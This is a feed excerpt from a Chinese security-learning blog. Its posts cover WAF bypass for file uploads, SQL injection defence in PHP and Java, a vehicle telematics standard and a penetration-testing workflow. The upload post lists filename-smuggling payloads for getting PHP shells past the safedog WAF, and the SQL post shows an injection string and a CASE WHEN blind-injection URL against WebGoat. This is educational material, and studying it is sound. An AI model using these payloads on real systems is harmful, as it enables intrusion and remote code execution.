    <summary type="html">&lt;h1 id=&quot;xss跨站基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss跨站基础&quot;&gt;&lt;/a&gt; XSS跨站基础&lt;/h1&gt;
&lt;h2 id=&quot;原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#原理&quot;&gt;&lt;/a&gt; 原理&lt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="XSS" scheme="https://j3f5.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>文件上传进阶-waf绕过及安全修复</title>
    <link href="https://j3f5.github.io/articles/2023/05/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/"/>
    <id>https://j3f5.github.io/articles/2023/05/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/</id>
    <published>2023-05-30T07:22:30.000Z</published>
    <updated>2023-05-30T07:22:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="上传参数名解析明确哪些参数名可以修改"><a class="markdownIt-Anchor" href="#上传参数名解析明确哪些参数名可以修改"></a> 上传参数名解析：明确哪些参数名可以修改</h1><ul><li>content-Disposition:一般可更改（form-data）接受表单的数据</li><li>name:表单参数值，不能更改</li><li>filename:文件名，可以更改</li><li>connect-Type：文件MIME，试情况而定</li></ul><h1 id="常见绕过方法"><a class="markdownIt-Anchor" href="#常见绕过方法"></a> 常见绕过方法</h1><ul><li><p>数据溢出-防止匹配（<code>xxx...</code>）也就是垃圾数据使得WAF无法匹配</p><ul><li><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/image-20230530153840549.png" alt="image-20230530153840549" /></li><li><code>Content-Disposition: form-data; **大量垃圾数据**; name=“upload_file” ; 大量垃圾数据; filename=&quot; xxxx&quot;</code></li><li>拦截继续，拦截就继续加。但是可能会上传失败，上传失败就不好用了</li></ul></li><li><p>符号变异-防匹配（<code>' &quot; ;</code>）匹配<code>''</code>以及<code>&quot;&quot;</code>里面的内容，没匹配到，所以绕过</p><ul><li>safedog匹配文件名的原则，应该是在“xxxx” ‘xxxx’ 双引号或单引号之间的。双引号在后面的时候，被安全狗拦截，说明匹配的是后面的双引号，(或者单引号),之前的文件名</li></ul></li><li><p>数据截断-防匹配（<code>%00 ; 换行</code>）</p><ul><li><p>换行后，安全狗匹配的就是</p></li><li><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/image-20230530155147840.png" alt="image-20230530155147840" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x.p\nph\np</span><br><span class="line">x.\np\nph\np</span><br><span class="line">x\n.\np\nph\np</span><br><span class="line">\nx\n.\np\nph\np</span><br></pre></td></tr></table></figure></li></ul></li><li><p>重复数据-防匹配（<code>参数多次</code>） 主要是绕过狗子，然后进行绕过</p><ul><li><p>白名单概念 过滤filename中的值，就把数据包的一些数据名称（白名单概念）插入到其中</p></li><li><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/image-20230530155249886.png" alt="image-20230530155249886" /></p></li><li><p><code>filename=&quot; Content-Disposition: form-data; name=“upload_file” ; x.php&quot;</code></p><p><code>Content-Disposition： form-data； name=“upload_file” ; x.php</code></p><p>安全狗认为：当检测Filename的时候，由于递归关系，继续检测，因为<code>x.php</code>跟在了之前的<code>Content-Disposition： form-data； name=&quot;upload_file&quot;</code>的后面，而不是<code>filename</code>的值，所以他认为是无用数据，但是在数据包中<code>x.php</code>确实在<code>“xxxxx”</code> 双引号之间，所以会被成功上传。</p></li></ul></li></ul><h2 id="怎么去学习绕过waf"><a class="markdownIt-Anchor" href="#怎么去学习绕过waf"></a> 怎么去学习绕过waf</h2><p>因为WAF都是基于数据包检测的，所以你得知道WAF是怎么匹配我们的数据包的，就拿上面的例子来说。</p><ol><li>大量脏数据：可能就是waf匹配机制只是匹配前多少多少字节，然后后面就不匹配了</li><li><code>; filename</code>等识别：看正则匹配的条件，也就是绕过正则，一般改动不会影响数据上传的话，就直接该（参考可以改什么）</li></ol><p>只要清楚WAF的机制，那么我们学起来就会一通百通！</p><p>再举个例子，如果waf是检测<code>filename=&quot;&quot;</code>的最后一个<code>&quot;</code>，那么，只要我们这样构造：<code>filename=&quot;sss&quot;s.php</code>他就不拦截了，会保存为<code>s.php</code>。</p><p><strong>但是需要注意的是，你上传的必须都要是可以执行的php文件，因为解析漏洞可不是那么好找的！</strong></p><h1 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h1><ol><li>后端验证：采用服务端验证模式</li><li>后缀检测：基于黑名单，白名单过滤</li><li>MIME 检测：基于上传自带类型检测</li><li>内容检测：文件头，完整性检测</li><li>自带函数过滤：参考 uploadlabs 函数</li><li>自定义函数过滤：function check_file(){}</li><li>WAF 防护产品：宝塔，云盾，安全公司产品等</li></ol><h1 id="资源"><a class="markdownIt-Anchor" href="#资源"></a> 资源</h1><p>字典</p><ul><li><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></li><li><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li></ul><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> FUZZ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filename=x.php</span><br><span class="line">filename=&quot;x.php</span><br><span class="line">filename=&#x27;x.php</span><br><span class="line">filename=&quot;a.jpg;.php&quot;;</span><br><span class="line">filename=&quot;a.php%00.jpg&quot;</span><br><span class="line">filename=&quot;connect-disposition:from-data;</span><br><span class="line">name=&quot;upload_file&quot;;x.php&quot;</span><br><span class="line">filename=&quot;x.jpg&quot;;filename=&quot;x.jpg&quot;;.....filename=&quot;x.php&quot;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;上传参数名解析明确哪些参数名可以修改&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#上传参数名解析明确哪些参数名可以修改&quot;&gt;&lt;/a&gt; 上传参数名解析：明确哪些参数名可以修改&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;content-Dispositi</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="文件上传" scheme="https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>GBT-40855-2021——电动汽车远程服务与管理系统解读</title>
    <link href="https://j3f5.github.io/articles/2023/05/30/GBT-40855-2021%E8%A7%A3%E8%AF%BB/"/>
    <id>https://j3f5.github.io/articles/2023/05/30/GBT-40855-2021%E8%A7%A3%E8%AF%BB/</id>
    <published>2023-05-30T03:26:16.000Z</published>
    <updated>2023-05-30T03:26:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对象"><a class="markdownIt-Anchor" href="#对象"></a> 对象</h1><p>车载终端、车辆企业平台与公共平台间的数据通信。</p><p>测试要求与对象一般包括：</p><ol><li>硬件/固件、软件系统、日志</li><li>网络端口传输、远程升级</li><li>数据存储</li></ol><img src="/images/GBT-40855-2021%E8%A7%A3%E8%AF%BB/image-20230530113018786.png" alt="image-20230530113018786" style="zoom:50%;" /><h1 id="车载终端的安全需求"><a class="markdownIt-Anchor" href="#车载终端的安全需求"></a> 车载终端的安全需求</h1><h2 id="硬件"><a class="markdownIt-Anchor" href="#硬件"></a> 硬件：</h2><h3 id="不存在后门与隐蔽接口"><a class="markdownIt-Anchor" href="#不存在后门与隐蔽接口"></a> 不存在后门与隐蔽接口</h3><h3 id="调试接口应禁用或设置安全访问控制"><a class="markdownIt-Anchor" href="#调试接口应禁用或设置安全访问控制"></a> 调试接口应禁用或设置安全访问控制</h3><h1 id="平台间的安全需求"><a class="markdownIt-Anchor" href="#平台间的安全需求"></a> 平台间的安全需求</h1><p><a href="https://blog.csdn.net/ananas_orangey/article/details/119461914">https://blog.csdn.net/ananas_orangey/article/details/119461914</a></p><p><a href="https://www.cnblogs.com/tomyyyyy/p/17174932.html">https://www.cnblogs.com/tomyyyyy/p/17174932.html</a></p><p><a href="https://zhuanlan.kanxue.com/article-16906.htm">https://zhuanlan.kanxue.com/article-16906.htm</a></p><p><a href="https://supergate.top/2021/04/06/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/">https://supergate.top/2021/04/06/车联网安全测试入门总结/车联网安全测试入门总结/</a></p><p><a href="https://www.ctfiot.com/23461.html">https://www.ctfiot.com/23461.html</a></p><p><a href="https://www.eet-china.com/mp/a167077.html">https://www.eet-china.com/mp/a167077.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;对象&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#对象&quot;&gt;&lt;/a&gt; 对象&lt;/h1&gt;
&lt;p&gt;车载终端、车辆企业平台与公共平台间的数据通信。&lt;/p&gt;
&lt;p&gt;测试要求与对象一般包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;硬件/固件、软件系统、日志&lt;/</summary>
      
    
    
    
    <category term="车联网标准" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"/>
    
    
    <category term="远程服务系统" scheme="https://j3f5.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-防御措施与代码级安全</title>
    <link href="https://j3f5.github.io/articles/2023/05/30/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%BA%A7%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/05/30/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%BA%A7%E5%AE%89%E5%85%A8/</id>
    <published>2023-05-30T03:16:46.000Z</published>
    <updated>2023-05-30T03:16:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h1><h2 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h2><p><strong>对数据类型进行检查和转义/预编译</strong></p><ol><li><p><code>magic_quotes_gpc = On </code></p></li><li><p><strong>预处理查询 (Prepared Statements)</strong><br />使用prepared statements（预处理语句）和参数化的查询，可以有效的防止sql注入。</p><ol><li><p>使用mysqli:prepare()实现。也是用<code>?</code>占位符实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $dbConnection-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = ?&#x27;);</span><br><span class="line">$stmt-&gt;bind_param(&#x27;s&#x27;, $name); // &#x27;s&#x27; specifies the variable type =&gt; &#x27;string&#x27;</span><br><span class="line">$stmt-&gt;execute();</span><br></pre></td></tr></table></figure></li><li><p>使用pdo实现。默认情况下，PDO会使用DSN中指定的字符集对输入参数进行本地转义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = :name&#x27;);</span><br><span class="line">$stmt-&gt;execute([ &#x27;name&#x27; =&gt; $name ]);</span><br></pre></td></tr></table></figure></li></ol></li></ol><p><strong>隐藏错误信息</strong></p><ol><li><strong>php.ini 中的 display_errors 选项，应该设为　display_errors = off</strong>。这样 php 脚本出错之后，不会在 web 页面输出错误，以免让攻击者分析出有作的信息。</li><li><strong>调用 mysql_query 等 mysql 函数时，前面应该加上 @，即 @mysql_query(…)，这样 mysql 错误不会被输出</strong>。同理以免让攻击者分析出有用的信息</li></ol><p><a href="https://segmentfault.com/a/1190000008117968">https://segmentfault.com/a/1190000008117968</a></p><h1 id="java"><a class="markdownIt-Anchor" href="#java"></a> JAVA</h1><h2 id="jdbc-拼接不当造成sql-注入"><a class="markdownIt-Anchor" href="#jdbc-拼接不当造成sql-注入"></a> JDBC 拼接不当造成SQL 注入</h2><p>JDBC 有两种方法执行SQL 语句，分别为<strong>PrepareStatement</strong> 和<strong>Statement</strong>。两个方法的区别在于<strong>PrepareStatement</strong> 会对SQL 语句进行<strong>预编译</strong>，而<strong>Statement</strong> 方法在<strong>每次执行时都需要编译</strong>，<strong>会增大系统开销</strong>。</p><p>理论上PrepareStatement 的效率和安全性会比Statement 要好，但并不意味着使用PrepareStatement 就绝对安全，不会产生SQL注入。正确地使用PrepareStatement 可以有效避免SQL 注入的产生，使用 <strong>?</strong> 作为占位符时，填入对应字段的值会进行严格的类型检查。将前面的“<strong>拼接构造SQL 语句</strong>”改为如下“<strong>使用占位符构造SQL 语句</strong>”的代码片段，即可有效避免SQL 注入的产生。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = &quot;</span>+req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">out.println(sql);</span><br><span class="line">...</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = ?&quot;</span>; <span class="comment">//使用了占位符</span></span><br><span class="line">out.println(sql);</span><br><span class="line">...</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">pstt.setInt(<span class="number">1</span>, Integer.parseInt(req.getParameter(<span class="string">&quot;id&quot;</span>)));</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="框架sql注入"><a class="markdownIt-Anchor" href="#框架sql注入"></a> 框架SQL注入</h2><p>如今的 Java 项目或多或少会使用对 JDBC 进行更抽象封装的持久化框架，如 <strong>MyBatis</strong> 和 <strong>Hibernate</strong>。常见的框架SSH（Struts2+Spring+Hibernate）和SSM（Spring MVC+Spring+MyBatis）分别指的就是以上两个框架</p><h3 id="mybatis"><a class="markdownIt-Anchor" href="#mybatis"></a> MyBatis</h3><p>MyBatis 框架的思想是将SQL 语句编入配置文件中，避免SQL 语句在Java 程序中大量出现，方便后续对SQL 语句的修改与配置。</p><p>MyBatis中使用<strong>parameterType</strong>向SQL 语句传参，在SQL引用传参可以使用<code>#&#123;Parameter&#125;</code>和<code>$&#123;Parameter&#125;</code>两种方式。</p><h4 id="与的区别"><a class="markdownIt-Anchor" href="#与的区别"></a> <code>#</code>与<code>$</code>的区别</h4><p>总的来说就是<code>#</code>是预编译，但是<code>$</code>不是。</p><p><strong>使用<code>#&#123;Parameter&#125;</code>构造SQL 的代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getUsername&quot;</span> resultType=<span class="string">&quot;com.z1ng.bean.User&quot;</span>&gt;</span><br><span class="line">select id,name,age from user <span class="type">where</span> <span class="variable">name</span> <span class="operator">=</span> #&#123;name&#125;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">Preparing: select id,name,age from user <span class="type">where</span> <span class="variable">name</span> <span class="operator">=</span> ? <span class="comment">//生成的语句</span></span><br></pre></td></tr></table></figure><p>从Debug 回显的SQL语句执行过程可以看出，使用<code>#&#123;Parameter&#125;</code>方式会使用“?”占位进行预编译，因此此时不存在SQL 注入。</p><p><strong>使用<code>$&#123;Parameter&#125;</code>构造SQL 的代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getUsername&quot;</span> resultType=<span class="string">&quot;com.z1ng.bean.User&quot;</span>&gt;</span><br><span class="line">select id,name,age from user <span class="type">where</span> <span class="variable">name</span> <span class="operator">=</span> #&#123;name&#125;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">Preparing: select id,name,age from user <span class="type">where</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&#x27;z1ng&#x27;</span> <span class="comment">//生成的语句</span></span><br></pre></td></tr></table></figure><p>从上面的演示可以看出，在底层构造完整SQL 语句时，MyBatis的两种传参方式所采取的方式不同。#{Parameter}采用预编译的方式构造SQL，避免了SQL 注入的产生。而<code>$&#123;Parameter&#125;</code>采用<strong>拼接的方式</strong>构造SQL，在对用户输入过滤不严格的前提下，此处很可能存在SQL 注入。</p><h3 id="hibernate"><a class="markdownIt-Anchor" href="#hibernate"></a> Hibernate</h3><p>Hibernate 框架是Java 持久化API（JPA）规范的一种实现方式。Hibernate将Java类映射到数据库表中，从 Java 数据类型映射到 SQL 数据类型。</p><blockquote><p>其使用HQL作为语言与数据库进行交互，HQL的语法与SQL类似，但有些许不同。受语法的影响，HQL注入在实际漏洞利用上具有一定的限制。Hibernate 是对持久化类的对象进行操作而不是直接对数据库进行操作，因此HQL 查询语句由Hibernate 引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate 引擎</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tx = session.beginTransaction();</span><br><span class="line">String parameter = &quot; zaaaa&#x27; or &#x27;1&#x27;=&#x27;1 &quot;;</span><br><span class="line">List user = session.createQuery(&quot;FROM User where name=&#x27;&quot;+parameter+&quot;&#x27;&quot;,User.class).getResultList();</span><br><span class="line">tx.commit();</span><br></pre></td></tr></table></figure><p>通过Debug 模式可以清晰地观察到变量“parameter”被拼接进语句中，并将原本的语义改变，查询出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from User</span><br><span class="line">where name = &#x27;zaaa&#x27;...</span><br></pre></td></tr></table></figure><p>正确使用以下几种<strong>HQL 参数绑定</strong>的方式可以有效避免注入的产生:</p><ol><li><p>位置参数（Positional parameter）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... where name = ?1; query.setParameter(1, parameter);</span><br></pre></td></tr></table></figure></li><li><p>命名参数（named parameter）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String parameter = &quot;z1ng&quot; ; ... where name = :name&quot;; query.setParameter(&quot;name&quot;, parameter);</span><br></pre></td></tr></table></figure></li><li><p>命名参数列表（named parameter list）</p></li><li><p>类实例（JavaBean）</p></li></ol><h2 id="防御不当预编译case注入"><a class="markdownIt-Anchor" href="#防御不当预编译case注入"></a> 防御不当（预编译CASE注入）</h2><p>SQL 注入最主要的成因在于未对用户输入进行严格的过滤，并采取不恰当的方式构造SQL 语句。在实际开发的过程中，有些地方难免需要使用拼接构造SQL 语句，<strong>例如SQL语句中order by 后面的参数无法使用预编译赋值</strong>。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。所以会存在 <strong>绕过</strong>：</p><p><strong>通过case when语句可以将order by后的orderExpression表达式中添加select语句</strong></p><p>即，即使参数化，但是还是会将注入代码重新写上去。</p><p>例子：</p><p>存在ORDER BY的请求：<code>http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip</code></p><p>则可以构造这个，发起盲注，其中{0}是下标，{1}是ascii</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case when (select substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27; from servers where hostname=&#x27;webgoat-prd&#x27;) then hostname else mac end</span><br></pre></td></tr></table></figure><h1 id="审计"><a class="markdownIt-Anchor" href="#审计"></a> 审计</h1><p>代码审计的核心思想是追踪参数，而追踪参数的步骤就是程序执行的步骤。因此，代码审计是一个跟踪程序执行步骤的过程，了解了框架的执行流程自然会了解如何如跟踪一个参数，剩下的就是观察在参数传递的过程中有没有一些常见的漏洞点。</p><p><strong>全局搜索</strong></p><p>首先看pom.xml，看用了什么数据库和什么框架。</p><p>然后搜索<code>query()</code>函数，看哪里用到了，就大概看一下。</p><p><strong>功能定点</strong></p><p>我们可以从程序的具体功能上进行定点的漏洞挖掘，与数据库交互的位置就有可能出现SQL 注入，比如用户信息页面</p><h1 id="防御sql注入"><a class="markdownIt-Anchor" href="#防御sql注入"></a> 防御SQL注入</h1><p>需要分清各种防御针对的对象是谁。</p><ol><li>SQL语句的执行代码使用<strong>预编译</strong> PreparedStatement （参数绑定）。</li><li>利用 session 防御，session 内容正常情况下是用户无法修改的 <code>select * from users where user = &quot;'&quot; +session.getAttribute(&quot;UserID&quot;) + &quot;'&quot;;</code></li><li>存储过程防御</li><li><strong>确定每个数据的类型</strong>，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？)</li><li><strong>限制传入数据的长度</strong>，这能够在一定程度上防止sql注入。</li><li>严格<strong>限制</strong>用户使用<strong>数据库的权限</strong>，能够在一定程度上减少sql注入的危害。</li><li>避免直接响应一些 sql 语句<strong>执行异常的信息</strong>。</li><li><strong>过滤</strong>参数中含有的一些数据库<strong>关键词</strong>。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#php&quot;&gt;&lt;/a&gt; PHP&lt;/h1&gt;
&lt;h2 id=&quot;防御&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#防御&quot;&gt;&lt;/a&gt; 防御&lt;/h2&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试整体流程</title>
    <link href="https://j3f5.github.io/articles/2023/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
    <id>https://j3f5.github.io/articles/2023/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/</id>
    <published>2023-05-29T14:53:16.000Z</published>
    <updated>2023-05-30T01:20:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><ol><li>明确目标</li><li>分析风险、获得授权</li><li>信息搜集</li><li>漏洞探测</li><li>漏洞验证</li><li>信息分析</li><li>利用漏洞</li><li>信息整理</li><li>形成报告</li></ol><h1 id="明确目标"><a class="markdownIt-Anchor" href="#明确目标"></a> 明确目标</h1><ol><li>确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块</li><li>确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权…<ul><li>目标系统介绍、重点保护对象及特性。</li><li>是否允许数据破坏？</li><li>是否允许阻断业务正常运行？</li><li>测试之前是否应当知会相关部门接口人？</li><li>接入方式？外网和内网？</li><li>测试是发现问题就算成功，还是尽可能的发现多的问题？</li><li>渗透过程是否需要考虑社会工程？</li></ul></li><li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？根据需求和自己技术能力来确定能不能做、能做多少</li></ol><h1 id="分析风险-获得授权"><a class="markdownIt-Anchor" href="#分析风险-获得授权"></a> 分析风险、获得授权</h1><p>分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本…由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。</p><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="信息搜集" /></p><h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1><p>利用上一步中列出的信息，使用相应的漏洞检测</p><p>方法：1）漏扫：AWVS、AppScan…2）结合漏洞去exploit-db等位置找利用3）在网上寻找验证POC</p><p>内容：系统漏洞：系统没有及时打补丁Websever漏洞：Websever配置问题Web应用漏洞：Web应用开发问题其它端口服务漏洞：各种21/8080(st2)/7001/22/3389通信安全：明文传输，token在cookie中传送等</p><h1 id="漏洞验证"><a class="markdownIt-Anchor" href="#漏洞验证"></a> 漏洞验证</h1><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。</p><ul><li>自动化验证：结合自动化扫描工具提供的结果</li><li>手工验证：根据公开资源进行验证</li><li>试验验证：自己搭建模拟环境进行验证</li><li>登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息</li><li>业务漏洞验证：如发现业务漏洞，要进行验证</li><li>公开资源的利用exploit-db/wooyun/渗透代码网站通用、缺省口令厂商的漏洞警告等</li></ul><h1 id="信息分析"><a class="markdownIt-Anchor" href="#信息分析"></a> 信息分析</h1><p>为下一步实施渗透做准备</p><ul><li>精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击</li><li>绕过防御机制：是否有防火墙等设备，如何绕过</li><li>定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</li><li>绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</li><li>攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</li></ul><h1 id="利用漏洞获取数据"><a class="markdownIt-Anchor" href="#利用漏洞获取数据"></a> 利用漏洞，获取数据</h1><ul><li>实施攻击：根据前几步的结果，进行攻击</li><li>获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</li><li>进一步渗透：内网入侵，敏感目标</li><li>持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</li><li>清理痕迹：清理相关日志（访问，操作），上传文件等</li></ul><h1 id="信息整理"><a class="markdownIt-Anchor" href="#信息整理"></a> 